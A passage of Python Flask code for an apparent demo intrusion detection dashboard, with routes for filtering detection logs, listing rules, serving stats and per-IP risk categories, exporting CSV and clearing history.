            "primary_reason": result["primary_reason"],
            "action_taken": result["action_taken"],
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })

    flash(f"Analysis complete: Traffic evaluated as {result['risk_level']}. {result['primary_reason']}", "info")
    return redirect(url_for("dashboard"))


@app.route("/history")
@login_required
def history():
    filter_risk = request.args.get("risk", "").strip()
    search_query = request.args.get("q", "").strip()

    conn = get_db()
    cursor = conn.cursor()

    query = "SELECT * FROM detection_logs WHERE 1=1"
    params = []

    if filter_risk and filter_risk in ["Safe", "Suspicious", "High Risk"]:
        query += " AND risk_level = ?"
        params.append(filter_risk)

    if search_query:
        query += " AND (source_ip LIKE ? OR payload LIKE ? OR action_taken LIKE ?)"
        like_term = f"%{search_query}%"
        params.extend([like_term, like_term, like_term])

    query += " ORDER BY timestamp DESC"
    cursor.execute(query, params)
    raw_logs = cursor.fetchall()
    conn.close()

    logs = []
    for row in raw_logs:
        item = dict(row)
        try:
            item["rules_list"] = json.loads(item["triggered_rules"]) if item["triggered_rules"] else []
        except Exception:
            item["rules_list"] = []
        logs.append(item)

    return render_template(
        "history.html",
        logs=logs,
        user=session.get("user"),
        filter_risk=filter_risk,
        search_query=search_query,
        count=len(logs)
    )


@app.route("/rules")
@login_required
def rules_view():
    return render_template(
        "rules.html",
        user=session.get("user"),
        rules=RULE_CATALOG,
        blacklisted_ips=list(BLACKLISTED_IPS)
    )


@app.route("/api/stats")
@login_required
def api_stats():
    conn = get_db()
    cursor = conn.cursor()

    cursor.execute("SELECT COUNT(*) FROM detection_logs WHERE risk_level = 'Safe'")
    safe = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM detection_logs WHERE risk_level = 'Suspicious'")
    suspicious = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM detection_logs WHERE risk_level = 'High Risk'")
    high_risk = cursor.fetchone()[0]

    cursor.execute("SELECT COUNT(*) FROM detection_logs")
    total = cursor.fetchone()[0]

    conn.close()

    return jsonify({
        "safe": safe,
        "suspicious": suspicious,
        "high_risk": high_risk,
        "total": total
    })


@app.route("/api/categorized-ips")
@login_required
def api_categorized_ips():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT 
            source_ip,
            COUNT(*) as total_events,
            MAX(threat_score) as max_score,
            MAX(timestamp) as last_seen,
            CASE 
                WHEN SUM(CASE WHEN risk_level = 'High Risk' THEN 1 ELSE 0 END) > 0 THEN 'High Risk'
                WHEN SUM(CASE WHEN risk_level = 'Suspicious' THEN 1 ELSE 0 END) > 0 THEN 'Suspicious'
                ELSE 'Safe'
            END as ip_category
        FROM detection_logs
        GROUP BY source_ip
        ORDER BY max_score DESC, total_events DESC
    """)
    rows = [dict(r) for r in cursor.fetchall()]
    conn.close()
    return jsonify({
        "all": rows,
        "safe": [r for r in rows if r["ip_category"] == "Safe"],
        "suspicious": [r for r in rows if r["ip_category"] == "Suspicious"],
        "high_risk": [r for r in rows if r["ip_category"] == "High Risk"]
    })


@app.route("/export-csv")
@login_required
def export_csv():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("""
        SELECT id, timestamp, source_ip, dest_port, protocol,
               payload, request_rate, user_agent, risk_level,
               threat_score, action_taken, analyst_user
        FROM detection_logs
        ORDER BY timestamp DESC
    """)
    rows = cursor.fetchall()
    conn.close()

    output = StringIO()
    writer = csv.writer(output)
    writer.writerow([
        "ID", "Timestamp", "Source IP", "Dest Port", "Protocol",
        "Payload", "Request Rate (req/min)", "User Agent",
        "Risk Level", "Threat Score", "Action Taken", "Analyst"
    ])

    for row in rows:
        writer.writerow(list(row))

    return Response(
        output.getvalue(),
        mimetype="text/csv",
        headers={"Content-disposition": "attachment; filename=ids_detection_logs.csv"}
    )


@app.route("/clear-history", methods=["POST"])
@login_required
def clear_history():
    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("DELETE FROM detection_logs")
    conn.commit()
    conn.close()
    flash("Detection event history cleared successfully.", "success")
    return redirect(url_for("history"))


# ---------------------------------------------------------------------------
# Application Entry Point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    init_db()
    print("=" * 60)
    print(" [✓] Intrusion Detection System (IDS) Engine Started")
    print(" [✓] Rule-based detection active (Zero AI/ML)")
    print(" [✓] SQLite Database: ids_database.db initialized")
    print(" [✓] Demo Credentials: admin / admin123")
    print(" [✓] Access at: http://127.0.0.1:5000/")
    print("=" * 60)
    app.run(debug=True, host="127.0.0.1", port=5000)
